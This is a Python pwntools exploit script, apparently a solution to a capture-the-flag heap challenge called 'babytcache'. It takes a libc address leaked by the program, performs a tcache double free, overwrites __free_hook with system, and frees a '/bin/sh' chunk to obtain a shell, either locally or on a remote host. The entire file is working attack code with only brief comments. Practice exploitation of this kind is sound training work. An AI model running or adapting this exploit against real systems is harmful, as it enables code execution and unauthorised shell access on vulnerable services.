#!/usr/bin/python3
from pwn import *
import time

os.chdir('../setup')
elf = context.binary = ELF("babytcache")
libc = elf.libc
context.terminal = ['tilix', '-a', 'app-new-session', '-e']


def log_addr(name, address):
    s = '{}'.format(name).ljust(16, ' ')
    s += ': {:#x}'.format(address)
    log.info(s)


gs = '''
init-pwndbg
set breakpoint pending on
break execve
continue
'''

HOST = '192.168.125.12'
PORT = 2337

DELAY = 0.5  # needed for remote

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        return remote(HOST, PORT)
    elif args.LR:
        return remote('localhost', PORT)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def create(name):
    global index
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("1")
    io.sendafter("chars): ", name)
    index += 1
    return index - 1


# Select the "free" option; send index.
def free(index):
    io.recvuntil('Please enter an option from the main menu: ')
    io.sendline("2")
    io.sendlineafter("Index: ", str(index))


io = start()
io.timeout = 0.1

# Libc leak given
io.recvuntil("[printf]: ")
libc.address = int(io.recvline(), 16) - libc.sym.printf
log_addr("libc", libc.address)

# =-=-=-=-=-=-=-=-= double free =-=-=-=-=-=-=-=-=

# Request two chunks
a = create(b"rick")
binsh = create(b'/bin/sh\x00')

# Trigger double free.
# Tcache before glibc 2.29 doesn't have check
free(a)
free(a)

# =-=-=-=-=-=-=-=-= tcachebin dup =-=-=-=-=-=-=-=-=

# overwrite a fd with __free_hook
# tcache does not check size of chunk being linked into bins
# tcache uses pointers to user data
create(p64(libc.sym.__free_hook))

# allocate dummy chunk
create(b'morty')

# get arbitrary write pointer and overwrite __free_hook
create(p64(libc.sym.system))

# Trigger system('/bin/sh')
free(binsh)
io.interactive()
